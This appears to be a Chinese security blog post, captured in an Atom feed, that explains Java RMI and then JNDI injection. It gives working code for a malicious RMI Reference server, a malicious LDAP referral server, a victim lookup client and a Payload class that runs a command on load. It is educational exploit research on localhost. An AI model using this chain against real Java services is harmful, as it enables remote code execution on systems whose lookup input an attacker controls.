    <summary type="html">&lt;h1 id=&quot;阅读本篇文章前注意事项&quot;&gt;&lt;a href=&quot;#阅读本篇文章前注意事项&quot; class=&quot;headerlink&quot; title=&quot;阅读本篇文章前注意事项&quot;&gt;&lt;/a&gt;阅读本篇文章前注意事项&lt;/h1&gt;&lt;p&gt;如果你是初次接触RMI,JNDI等概念,请先理解阅读我写的另一篇文章</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RMI源码分析" scheme="https://men9da.cn/tags/RMI%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>RMI,JNDI初探</title>
    <link href="https://men9da.cn/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/"/>
    <id>https://men9da.cn/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/</id>
    <published>2022-03-07T11:56:29.000Z</published>
    <updated>2022-03-16T07:26:18.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>在学习JAVA安全的路上有许多不顺利的地方,早早就听闻RMI,JNDI注入。最初我作为一个初学者,以为JNDI注入是不是就是类似sql注入和ongl表达式注入那样在某个输入框输入payload直接就触发然后就命令执行,带出数据xxx或者执行其他操作.但是当我初次研究后,处于一脸懵逼的状态,他好像比我想象中的复杂,接触初期觉得复杂肯定不是因为背后的代码有多么复杂,而是被概念搞混。本篇文章将会又最基本的概念解释开始讲起,逐渐深入其实现原理。</p><h1 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI?"></a>什么是RMI?</h1><p>RMI全称(Java Remote Method Invocation)JAVA远程方法调用,顾名思义,RMI是一个<strong>行为</strong>,我们把<strong>在一个JVM中调用另一个JVM中的JAVA方法的这种行为</strong>称之为RMI。</p><p>要完成RMI这个行为,我们分为三个步骤</p><p>1.Client-客户端 调用服务端方法</p><p>2.Server-服务端 给客户端提供方法进行调用<strong>注:代码将在服务端执行,而不是客户端。客户端获得的只是方法在客户端执行后的返回值</strong></p><p>3.Register-注册中心 :本质是一个map,里面保存着客户端查询要调用的方法的引用</p><p>举个例子,下面编写两个程序,一个程序A,一个程序B,他们将会运行在各自的JVM中:</p><p>程序A:存在一个能被B远程调用的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;此处在程序A中被调用&quot;</span>);</span><br><span class="line">        System.out.println(Runtime.getRuntime());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;程序B接收到返回值!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> HelloServiceImpl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码解释:</p><p>创建了一个HelloService的接口,继承自Remote,因为RMI是一个双方进行通信的行为,所以他们双方都必须继承于Remote,Remote是用来进行远程调用的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个HelloServiceImpl类,这个接口需要继承制UnicastRemoteObject并且实现我们刚刚的创建的接口</p><p>UnicastRemoteObject:在实例化HelloServiceImpl类时,由于继承自UnicastRemoteObject,UnicastRemoteObject会将HelloServiceImpl对象导出,返回它的stub(stub称之为存根,是他的一个代理,可以理解为HelloServiceImp的一个复制品,这个复制品是保存在RMI注册服务中的)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;此处在程序A中被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;程序B接收到返回值!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在1099端口上启动registry服务并且将HelloServiceImpl的存根绑定到服务上,并且取名为hello</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> HelloServiceImpl());</span><br></pre></td></tr></table></figure><p>程序B:用来调用远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        HelloService helloService = (HelloService) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(helloService.sayHello());</span><br><span class="line">        System.out.println(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码解释:</p><p>同样需要定义一个HelloService接口继承自Remote,用于接受前面registery绑定的HelloServiceImpl存根</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取registry并调用lookup从RMIService那拿到实现类,获取返回值并且输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">HelloService helloService = (HelloService) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(helloService.sayHello());</span><br></pre></td></tr></table></figure><p>让我们来看看执行结果:</p><p>首先运行A(Server),然后运行程序B(Client)</p><p>程序A运行结果:</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220307231955331.png" class title="image-20220307231955331"><p>程序B运行结果:</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220307232010560.png" class title="image-20220307232010560"><p><strong>结合刚刚我们的代码可以证实,我们调用的sayHello方法实在程序A中调用的,程序B仅仅只是获得了sayHello方法的返回值并且输出</strong></p><p><strong>JRMP</strong>:JRMP是一个在TCP/IP协议基础上实现的协议,就相当于web请求这样一个行为用到http协议一样,RMI的这样一个行为会用到JRMP协议</p><h1 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h1><p>JNDI(Java Naming and Directory Interface)JAVA命名和目录的接口。顾名思义,JNDI本质上是一个接口,这个接口是来干啥的呢?JNDI这个接口下会有很多目录系统服务的实现,rmi,ldap就是实现JNDI的接口的系统目录服务.这就是为啥每次提及到JNDI我们就不可避免的提到RMI和ladp等目录系统服务。</p><p><strong>JNDI注入发展阶段:网上流传了一张图,直接拿过来用了</strong></p><p>由于RMI配合JNDI的使用存在安全隐患,JAVA也在自己的升级中从源码层面进行了拦截和修复,但是也都衍生出了对应的绕过方式,下面一一进行分析。</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220307225135073.png" class title="image-20220307225135073"><p>动态加载恶意类不是很常见,直接从JNDI开始入手</p><h1 id="6U132-7U122-8U113阶段-RMI-JNDI注入"><a href="#6U132-7U122-8U113阶段-RMI-JNDI注入" class="headerlink" title="6U132/7U122/8U113阶段:RMI-JNDI注入"></a>6U132/7U122/8U113阶段:RMI-JNDI注入</h1><p>此阶段的意思就是通过JNDI接口提供的方法(InitialContext().lookup)去代替通过registry.lookup注册中心获取数据调用的lookup方法</p><p><strong>服务端代码</strong></p><p>创建注册中心,创造一个Reference,Refernce的三个参数含义分别是:</p><p>1.指定需要加载的class文件名:去指定网络路径下载Payload.class文件</p><p>2.指定需要加载的类名:加载Payload.class文件中的Payload类</p><p>3.指定寻找class文件的路径</p><p>实例化一个referenceWarpper,将这个referenceWarpper绑定到对应字符串上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, NamingException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;http://127.0.0.1:80/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;C:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>客户端代码</strong></p><p>调用InitialContext的lookup方法查找对应关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NamingException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;D:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">        <span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload代码:</strong></p><p>编写了一个Payload类并在其静态代码块中放入我们要执行的代码,将其编译为class文件,然后将其放入web目录下,我这里起了一个apache,将Payload.class直接放在了web根目录,直接访问<a href="http://127.0.0.1/Payload.class%E5%B0%B1%E8%83%BD%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%88%B0%E5%AF%B9%E5%BA%94%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6">http://127.0.0.1/Payload.class就能直接下载到对应字节码文件</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;payload:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行服务端,客户端后成功运行如下输出:</p><p>服务端:</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220316142941350.png" class title="image-20220316142941350"><p>客户端:</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220316143127873.png" class title="image-20220316143127873"><p>可以看到静态代码块中的内容执行了,从输出的Runtime中也可以看到payload中的代码是在客户端当中执行的,和之前的”在服务端中执行并将返回值返回给客户端”不一致。</p><p>在利用的时候我们可控的是客户端代码,当服务器上的客户端代码中的lookup内容被我们控制,我们就能自己写一个服务端,让客户端去访问我们的恶意服务端,从而达到在服务器客户端上执行代码的效果</p><h1 id="8u113-8u191阶段LDAP-JNDI注入"><a href="#8u113-8u191阶段LDAP-JNDI注入" class="headerlink" title="8u113-8u191阶段LDAP-JNDI注入"></a>8u113-8u191阶段LDAP-JNDI注入</h1><p>在8U131之后,RMI-JNDI被JAVA官方修复,可以使用LDAP-JNDI进行绕过,LDAP也是一种目录访问协议</p><p>服务端代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span><span class="params">(URL cb)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">//TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可</span></span><br><span class="line">        String url = <span class="string">&quot;http://localhost/#Payload&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NamingException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;D:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">        <span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;ldap://127.0.0.1:1099/hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:可以看到与RMI-JNDI一样,恶意代码运行在了客户端</p><img src="/2022/03/07/RMI-JNDI%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/image-20220316152536669.png" class title="image-20220316152536669">]]></content>
    
    
      
      
